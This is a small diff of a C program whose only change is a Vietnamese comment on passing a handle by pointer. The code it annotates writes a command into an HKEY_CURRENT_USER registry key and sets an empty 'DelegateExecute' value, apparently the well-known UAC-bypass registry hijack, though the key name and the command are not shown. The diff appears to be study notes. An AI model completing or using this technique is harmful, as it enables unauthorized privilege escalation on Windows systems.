@@ -10,7 +10,8 @@ int main (){
     const char *deligateExecute = "";
 
     // open regkey & get handle, write to hregistryKey
-    RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)regkeyname, 0, NULL, 0, KEY_WRITE, NULL, &hregistryKey, NULL);
+    RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)regkeyname, 0, NULL, 0, KEY_WRITE, NULL, &hregistryKey, NULL); 
+    // truyen dia chi con tro cua bien handle can them toan tu & (&registryKey) do dinh nghia ham nhan 1 con tro de xac dinh vi tri luu du lieu handle tra ve
 
     // set value & close the handle
     RegSetValueEx(hregistryKey, "", 0, REG_SZ, (unsigned char*)regkeycommandvalue, strlen(regkeycommandvalue));
